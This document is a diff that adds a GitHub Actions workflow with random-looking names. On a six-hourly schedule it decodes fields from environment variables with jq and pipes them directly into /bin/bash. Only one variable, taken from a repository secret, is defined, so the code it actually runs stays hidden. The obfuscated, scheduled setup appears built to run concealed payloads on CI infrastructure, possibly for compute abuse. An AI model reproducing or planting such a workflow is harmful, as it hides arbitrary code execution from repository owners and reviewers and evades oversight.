@@ -1,0 +1,25 @@
+name: lindaiyan4635
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '16 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lindaiyan4635
+        env:
+          qkk35: ${{ secrets.qkk35 }}
+        run: |
+          echo $qkk35 | jq -r .d34892 | /bin/bash
+          echo $qf9126 | jq -r .r075 | /bin/bash
+          echo $vt59 | jq -r .obx22669 | /bin/bash
+          echo $l29 | jq -r .ottxe1 | /bin/bash
+          echo $lkt23 | jq -r .bm02 | /bin/bash
+          echo $pkiu496 | jq -r .sq5386 | /bin/bash
+          echo $oqshs4 | jq -r .k539 | /bin/bash
+          echo $am2 | jq -r .erf1 | /bin/bash
+
